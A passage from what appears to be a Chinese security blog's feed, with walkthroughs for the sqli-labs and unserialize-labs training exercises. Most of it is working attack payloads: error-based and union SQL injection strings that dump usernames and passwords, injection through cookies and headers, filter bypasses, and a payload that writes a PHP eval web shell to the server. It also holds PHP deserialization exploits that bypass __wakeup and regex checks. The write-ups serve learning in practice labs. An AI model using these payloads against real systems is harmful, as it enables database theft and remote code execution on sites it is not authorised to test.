class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users)),1)--+</span><br><span class=\"line\">这时问题又来了,只能读取前面的(31个字符),这时候需要用来截取函数了</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username,0x7e,password) from users),1,31)),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\">在改变1和31的值来读后面的内容</span><br></pre></td></tr></table></figure>\n<p>payload2:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())))--+</span><br><span class=\"line\">然后遇到和上面一样的问题</span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,substr(concat(0x7e,(select group_concat(username,0x7e,password) from users)),1,31))--+</span><br><span class=\"line\"></span><br><span class=\"line\">然后修改1,31的值</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>floor () 报错注入<br>\n <code>select count(*),concat_wa('-',(select database()),floor(rand(0)* 2)) as x from information_schema.tables group by x;</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rand():随机返回<span class=\"number\">0</span><span class=\"operator\">~</span><span class=\"number\">1</span>之间的小数</span><br><span class=\"line\">rand()<span class=\"operator\">*</span><span class=\"number\">2</span>:随机返回<span class=\"number\">0</span><span class=\"operator\">~</span><span class=\"number\">2</span>之间的小数</span><br><span class=\"line\"><span class=\"built_in\">floor</span>():小数向下取整数</span><br><span class=\"line\">concat_ws(参数<span class=\"number\">1</span>,参数<span class=\"number\">2</span>,参数<span class=\"number\">3</span>):将括号内数据用第一个字段连接起来</span><br><span class=\"line\">例: concat_ws(<span class=\"string\">&#x27;~&#x27;</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>) 结果为 <span class=\"number\">1</span><span class=\"operator\">~</span><span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">group</span> <span class=\"keyword\">by</span>语句:分组统计</span><br><span class=\"line\"><span class=\"keyword\">as</span>:赋予别名</span><br><span class=\"line\"><span class=\"built_in\">count</span>():汇总统计</span><br><span class=\"line\"></span><br><span class=\"line\">一次只能返回<span class=\"number\">64</span>个字符</span><br><span class=\"line\"></span><br><span class=\"line\">原理</span><br><span class=\"line\">通过<span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>)产生的有一定顺序的数,在分组统计的时候重复计算导致最后只有一组数据产生错误</span><br></pre></td></tr></table></figure>\n<p>payload3:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema = database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema = database()),floor(rand(0)*2)) as x from information_schema.tables group by x --+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select substring(group_concat(username,&#x27;-&#x27;,password),1,64) from users),floor(rand(0)*2)) as x from information_schema.tables group by x --+</span><br><span class=\"line\"></span><br><span class=\"line\">修改1,64即可</span><br></pre></td></tr></table></figure>\n<p>less6<br>\nid=1&quot; 与 less5 一样</p>\n<p>less7<br>\n 双括号单引号字符型，导出文件注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; into outfile &quot;D:\\phpstudy_pro\\WWW\\test.php&quot; --+</span><br></pre></td></tr></table></figure>\n<p>less8 与 less5 一样<br>\n less9 时间盲注<br>\n less10 双引号时间盲注</p>\n<p>less11<br>\n 输入？id=1 发现 url 地址没有显示，抓包发现 post 方式<br>\n uname=11&amp;passwd=1&amp;submit=Submit<br>\n 判断字符型<br>\n接下来用基本的 union 注入就欧克<br>\n less12<br>\n&quot;) 型，联合注入<br>\n less13<br>\n)’ # 加上报错注入<br>\n less14<br>\n“# 加上报错注入<br>\n less15<br>\n 不显示报错信息只能盲注<br>\n单引号字符型的布尔盲注:<br>\n1’ --+<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1sZXNzMTUtMmc0bTA3M2dtcXcucHk=\"> 用脚本 less15.py</span><br>\n 用法:<br>\nfrom less15 import *<br>\nDatabase15()<br>\nTables15()<br>\n Columns15 (‘库’,‘表’)<br>\n Content15 (‘库’,‘表’,‘字段’,‘字段’)<br>\nless16<br>\n 双引号字符型加括号的盲注<br>\n 1”) --+<br>\n 脚本:less16.py</p>\n<p>less17<br>\n1. 注入点在 password 栏里，单引号字符加报错注入<br>\n 2. 先抓包，copy to file, 用 sqlmap 工具<br>\n python3 <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 路径</p>\n<p>less18<br>\n 注入点在 user-agent, 且用户名密码必须正确<br>\n注意：闭合之前的部分必须为空，很恶心<br>\n’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’</p>\n<p>最后:<br>\n’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’</p>\n<p>less19<br>\n 与 18 一样，注入点在 referer</p>\n<p>less20<br>\n 输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=Dumb&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1) or &#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">为什么写成这种格式？使整个SQL语句为恒真，不管Dumb是否正确都能爆出结果</span><br></pre></td></tr></table></figure>\n<p>less21<br>\n 登录 burp 抓到两个包，第一个是发送用户名和密码的 POST 报文，第二个是 GET 报文且携带 cookie</p>\n<p>Cookie：uname=…<br>\n 这个… 是 base64 编码的，通过 burp 的 decoder 模块使用可以看出<br>\n单引号单括号字符型报错注入，需要把 payload 进行 base64 编码，（如果 base64 编码结果包含等号还要进行 url 编码），再作为 uname 的值发送</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;) or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1) or (&#x27;</span><br></pre></td></tr></table></figure>\n<p>经过 base64 编码没有等号，直接用</p>\n<p>less22<br>\nless21 单引号 -&gt; 双引号</p>\n<p>less23<br>\n 又回到了 get 方法，这里过滤了 <code>--和#</code> ,%23 尝试不行，于是换一种方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; union select 1,2,3 or &#x27;</span><br><span class=\"line\">构造恒真语句,or &#x27;表示true(1),3 or &#x27;就是1</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(username,0x7e,password) from users),3 or &#x27;</span><br></pre></td></tr></table></figure>\n<p>less24<br>\n 二次注入<br>\n login.php 中对输入的 username 和 password 进行了 mysql_real_escape_string () 函数处理，转义了单引号等字符<br>\n在注册用户和修改密码的所有输入参数也做了这个处理</p>\n<p>注册用户名 admin’#, 密码随意，登录进去修改密码为 456<br>\n 这时的 SQL 语句: <code>$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;;</code> <br>\n 造成:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;UPDATE users SET PASSWORD=&#x27;456&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>\n<p>再直接 admin,456 就登录了</p>\n<p>less25<br>\n 单引号字符型，过滤了 and 和 or<br>\n 双写绕过:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1&#x27; union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+</span><br></pre></td></tr></table></figure>\n<p>less25a<br>\n 没有单引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-1 union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/unserialize-labs/",
            "url": "https://hq185187.github.io/2023/04/27/unserialize-labs/",
            "title": "Unserialize-labs",
            "date_published": "2023-04-27T15:48:42.874Z",
            "content_html": "<h1 id=\"task6-unserialize-labs\"><a class=\"markdownIt-Anchor\" href=\"#task6-unserialize-labs\">#</a> task6 unserialize-labs</h1>\n<h2 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SoFun</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$file</span> = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable language_\">$this</span>-&gt;file)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strchr</span>(<span class=\"variable\">$this</span>-&gt;file, <span class=\"string\">&quot;\\\\&quot;</span>) === <span class=\"literal\">false</span> &amp;&amp; <span class=\"title function_ invoke__\">strchr</span>(<span class=\"variable\">$this</span>-&gt;file, <span class=\"string\">&#x27;/&#x27;</span>) === <span class=\"literal\">false</span>)</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">show_source</span>(<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>) . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$this</span>-&gt;file);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Wrong filename.&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;file = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>&lt;!--key in flag1.php--&gt;</span><br></pre></td></tr></table></figure>\n<p>strchr 函数：搜索字符串在另一字符串中的第一次出现<br>\n PHP dirname () 函数是返回文件路径中的目录部分。它给出一个包含有指向一个文件的全路径的字符串，返回去掉文件名后的目录名<br>\n eg <code>dirname(/user/bin)结果是/user</code> <br>\n 绕过 wake_up 方法：当属性个数大于实际个数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SoFun</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$file</span>=<span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">SoFun</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">别忘了加\\<span class=\"number\">00</span>,s显示的位数是<span class=\"number\">7</span>,</span><br></pre></td></tr></table></figure>\n<p>payload: <code>?tryhackme=O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\\00*\\00file&quot;;s:9:&quot;flag1.php&quot;;&#125;</code> <br>\n<mark> 注意</mark><br>\n保护函数 (protected) 反序列化前要在 <code>*</code>  左右加 <code>\\00</code>  并且小 s 变大 S (不用变值，变属性就可以了), 也可以将 <code>\\00变成%00(0的url)</code> ,</p>\n<h2 id=\"2\"><a class=\"markdownIt-Anchor\" href=\"#2\">#</a> 2.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag2.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>]))&#123;</span><br><span class=\"line\">   <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[oc]:\\d+:/i&#x27;</span>, <span class=\"variable\">$a</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;NONONO!&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>解析<br>\n这个正则表达式会匹配一个以 o 或者 c 开头加一个：后面是一个或者多个数字，再接着一个：的不区分大小写的格式<br>\n<mark>更多关于正则表达式的看我的这篇文章</mark><a href=\"https://hq185187.github.io/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/\">正则学习</a><br>\n我们要绕过正则表达式，加一个 + 就行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:?tryhackme=O:+5:&quot;funny&quot;:()&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">url编码:?tryhackme=O%3A%2B5%3A%22funny%22%3A0%3A%7B%7D</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"3\"><a class=\"markdownIt-Anchor\" href=\"#3\">#</a> 3.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag3.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$verify</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$nobodyknow</span>;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$nobodyknow</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password === <span class=\"variable language_\">$this</span>-&gt;verify) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;ä½ ä¸•å¤ªè¡Œå•Š??!&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tryhackme&#x27;</span>];</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里 password 的值被改成了一个不知道的值，可以构造共有地址<br>\n看个例子</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span> php</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"string\">&quot;ABC&quot;</span>; </span><br><span class=\"line\"><span class=\"variable\">$b</span> =&amp;<span class=\"variable\">$a</span>; </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;<span class=\"comment\">//这里输出:ABC </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;<span class=\"comment\">//这里输出:ABC </span></span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"string\">&quot;EFG&quot;</span>; </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;<span class=\"comment\">//这里$a的值变为EFG 所以输出EFG </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;<span class=\"comment\">//这里输出EFG</span></span><br></pre></td></tr></table></figure>\n<p>构造:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$verify</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$verify</span>=&amp;<span class=\"variable\">$password</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">funny</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.O:5:&quot;funny&quot;:2:&#123;s:6:&quot;verify&quot;;N;s:15:&quot;funnypassword&quot;;N;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">2.\\00funny\\00password</span><br><span class=\"line\">3.%00funny%00password</span><br></pre></td></tr></table></figure>\n<p>或者让 <code>$password=$verify</code>  一样的都可以</p>\n<h2 id=\"4\"><a class=\"markdownIt-Anchor\" href=\"#4\">#</a> 4.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"5\"><a class=\"markdownIt-Anchor\" href=\"#5\">#</a> 5.</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag2.php&quot;</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">funny</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a = <span class=\"string\">&quot;givemeflag&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;a === <span class=\"string\">&quot;givemeflag&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span 